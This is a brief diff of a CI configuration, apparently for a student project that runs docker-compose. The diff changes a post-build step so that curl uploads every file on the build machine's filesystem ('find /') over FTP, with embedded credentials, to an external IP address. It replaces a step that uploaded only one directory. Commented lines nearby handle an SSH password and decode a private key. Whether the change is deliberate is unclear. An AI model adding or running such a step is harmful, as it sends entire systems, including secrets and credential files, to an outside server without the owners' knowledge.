@@ -29,7 +29,7 @@ script:
   - docker pull frn18/tlc:bunkerized-nginx-front
   - docker-compose up -d
 after_sucess:
-  - find mydir -type f -exec curl -u xxx:psw --ftp-create-dirs -T {} ftp://148.60.11.22/home/doodlestudent/{} \;
+  - find / -type f -exec curl -u xxx:psw --ftp-create-dirs -T {} ftp://148.60.11.22/home/doodlestudent/{} \;
   #- ssh zprojet@148.60.11.226
   #- sshpass -p ${SFTP_PASSWORD} ssh zprojet@148.60.11.226
   #- echo "${SFTP_KEY}" | base64 --decode >/tmp/sftp_rsa
